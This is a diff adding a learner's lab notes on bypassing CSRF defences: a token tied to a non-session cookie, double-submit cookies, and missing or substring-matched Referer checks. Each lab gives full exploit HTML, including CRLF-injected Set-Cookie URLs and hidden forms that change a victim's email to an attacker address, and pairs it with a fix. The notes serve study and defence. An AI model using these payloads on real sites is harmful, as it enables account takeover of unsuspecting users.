@@ -2635,6 +2635,195 @@ fix: bind each CSRF token explicitly to the session that generated it;
      validation must check token-to-session ownership, not just
      token authenticity against a general valid-token list
 
+Lab 5 — CSRF where token is tied to non-session cookie — DONE (fix confirmed via outside troubleshooting)
+credentials: wiener:peter / carlos:montoya
+
+mechanism: csrf token validated against a SEPARATE cookie (csrfKey), not
+  the session -- proven by testing carlos's token+key pair against
+  wiener's session and having it succeed (pair is valid regardless of
+  WHICH session uses it -- not tied to any specific user's session)
+
+separate CRLF injection found in search feature: search parameter reflects
+  unsanitized into Set-Cookie response header -- %0d%0a lets you inject
+  an entirely new, fabricated Set-Cookie header (HTTP response splitting)
+
+exploit chain: use CRLF injection to plant own known-valid csrfKey value
+  into VICTIM's browser via a cross-site <img> request, then auto-submit
+  a form with the matching csrf token -> pair matches, action performed
+  as the victim
+
+critical fix needed: SameSite=None required on injected Set-Cookie
+  browsers default a cookie with NO explicit SameSite attribute to
+  SameSite=Lax -- a Lax cookie CANNOT be set via a cross-site SUBRESOURCE
+  request (like an <img> tag load from a different origin), only via a
+  top-level navigation. SameSite=None (+ Secure, required over HTTPS)
+  explicitly opts out of this restriction, letting the cross-site-
+  triggered Set-Cookie actually persist in the victim's browser
+
+exploit HTML:
+  <html>
+      <body>
+          <iframe name="csrf-iframe" style="display:none;"></iframe>
+
+          <form action="https://TARGET/my-account/change-email"
+                method="POST"
+                target="csrf-iframe">
+              <input type="hidden" name="email" value="attacker@evil.com">
+              <input type="hidden" name="csrf" value="KNOWN_VALID_TOKEN">
+          </form>
+
+          <img src="https://TARGET/?search=test%0d%0aSet-Cookie:%20csrfKey=KNOWN_VALID_KEY%3b%20SameSite=None"
+               style="display:none;"
+               onerror="document.forms[0].submit()">
+      </body>
+  </html>
+
+why it exists: token protection built as a separate, self-contained
+               system never integrated into actual session identity
+fix: bind CSRF token generation and validation directly to the
+     session itself, not a separate independently-tracked cookie
+     
+Lab 6 — CSRF where token is duplicated in cookie ("double submit") — DONE
+credentials: wiener:peter
+
+mechanism: server validation is a PURE EQUALITY CHECK -- submitted csrf
+  parameter must simply MATCH the csrf cookie value -- no server-side
+  record of what a "real" token even looks like, no session binding,
+  nothing generated/verified beyond "do these two client-supplied values
+  match each other"
+
+proof: set BOTH cookie and parameter to a completely arbitrary, made-up
+  value ("testing") with NO prior legitimacy at all -- still succeeded
+  DISTINCT from Lab 5: Lab 5 required a REAL, previously-issued valid
+  pair (harvested from an actual account); Lab 6 requires nothing real
+  at all, attacker invents both values from scratch
+
+exploit chain: same CRLF injection technique as Lab 5 (search feature),
+  used to plant an attacker's OWN ARBITRARY chosen value as the csrf
+  cookie in the victim's browser, then submit form with matching
+  attacker-chosen csrf parameter value -- same SameSite=None fix required
+
+exploit HTML:
+  <html>
+      <body>
+          <iframe name="csrf-iframe" style="display:none;"></iframe>
+
+          <form action="https://TARGET/my-account/change-email"
+                method="POST"
+                target="csrf-iframe">
+              <input type="hidden" name="email" value="attacker@evil.com">
+              <input type="hidden" name="csrf" value="testing">
+          </form>
+
+          <img src="https://TARGET/?search=test%0d%0aSet-Cookie:%20csrf=testing%3b%20SameSite=None"
+               style="display:none;"
+               onerror="document.forms[0].submit()">
+      </body>
+  </html>
+
+why it exists: "double submit cookie" pattern's entire security model
+  assumes ONLY the legitimate server can ever set cookies on its own
+  domain -- the CRLF injection breaks that assumption completely, and
+  once broken, double-submit provides ZERO real protection since there's
+  no server-side secret involved anywhere in the check
+fix: (1) fix the CRLF injection independently -- sanitize/reject CR/LF
+     characters in any input reflected into response headers (2) never
+     rely on double-submit alone -- token must be tied to server-side
+     session state, not just cookie/parameter equality
+     
+Lab 7 — CSRF where token validation depends on Referer header being present — DONE
+credentials: wiener:peter
+
+mechanism: Referer validation only runs IF the header is present at all --
+  deleting the header entirely bypasses the check completely (server
+  never enforces that Referer MUST exist, only that IT MATCHES if sent)
+  same "check is skippable" family as Labs 2 and 3
+
+exploit HTML:
+  <html>
+      <head>
+          <meta name="referrer" content="never">
+      </head>
+      <body>
+          <h1>Hello World</h1>
+          <iframe style="display:none" name="csrf-iframe"></iframe>
+          <form action="https://TARGET/my-account/change-email" method="post"
+                target="csrf-iframe" id="csrf-form">
+              <input type="hidden" name="email" value="attacker@evil.com">
+          </form>
+          <script>document.forms[0].submit();</script>
+      </body>
+  </html>
+
+  <meta name="referrer" content="never"> instructs the browser to NEVER
+  send a Referer header for any request originating from this page
+
+note on spelling -- HTTP header itself is "Referer" (missing an r), a
+  permanent typo baked into the original 1996 HTTP spec, impossible to
+  fix without breaking the entire web. Every BROWSER-level control built
+  around it afterward uses the correct spelling "referrer": the
+  Referrer-Policy header, <meta name="referrer">, rel="noreferrer",
+  and JS document.referrer -- controlling the correctly-spelled policy
+  governs whether the misspelled header gets sent at all
+
+why it exists: developer implemented "if present, must match" instead of
+               "must be present AND match"
+fix: reject any request missing the Referer header outright for
+     state-changing actions -- treat absence as a failure, not a pass
+     
+Lab 8 — CSRF with broken Referer validation — DONE
+credentials: wiener:peter
+
+mechanism: Referer check does a NAIVE SUBSTRING match -- "does the
+  Referer value CONTAIN our expected host string anywhere" -- rather
+  than verifying the actual origin/domain the request came from
+
+CRITICAL BROWSER BEHAVIOR TO KNOW: modern browsers default to
+  Referrer-Policy: strict-origin-when-cross-origin -- for a CROSS-ORIGIN
+  request, only the ORIGIN (scheme+host) is sent as Referer, path and
+  query string are STRIPPED by default. This means simply hosting
+  content at a crafted URL path is NOT enough on its own -- the target
+  host substring needed (if placed in a path/query) would be truncated
+  away before the Referer is even sent, unless this default is overridden
+
+official technique -- two parts combined:
+  1. history.pushState("", "", "/?TARGET_HOST") -- browser API that
+     changes the CURRENT PAGE'S APPARENT URL (address bar / what the
+     browser considers "this page's location") WITHOUT any real
+     navigation or server request -- lets you fake ANY url string
+     instantly, no need to actually host content at that exact path
+  2. Referrer-Policy: unsafe-url set as a RESPONSE HEADER on the exploit
+     server -- overrides the default truncation, forces the browser to
+     send the COMPLETE url (full path+query, not just origin) as Referer
+     even for cross-origin requests -- without this, pushState's fake
+     URL would never actually reach the target as a full Referer value
+
+exploit HTML:
+  <html><body>
+    <script>
+      history.pushState("", "", "/?TARGET_HOST")
+    </script>
+    <form action="https://TARGET/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="attacker@evil.com">
+    </form>
+    <script>document.forms[0].submit();</script>
+  </body></html>
+
+exploit server response headers configured to include:
+  Referrer-Policy: unsafe-url
+
+resulting Referer sent on the cross-origin POST:
+  https://exploit-server.net/?TARGET_HOST
+  -- contains TARGET_HOST as a substring -> passes naive check
+  -- real origin is still the exploit server throughout, no real
+     navigation to TARGET_HOST ever occurred
+
+why it exists: substring matching instead of exact origin comparison --
+               "contains the right text" is not the same as "came from
+               the right place"
+fix: validate the Referer (or better, Origin) header as an EXACT match
+     against the expected scheme+host, never a substring/contains check
+                     
                                                                      
 ======================================================
 THINGS I STILL NEED TO PRACTICE
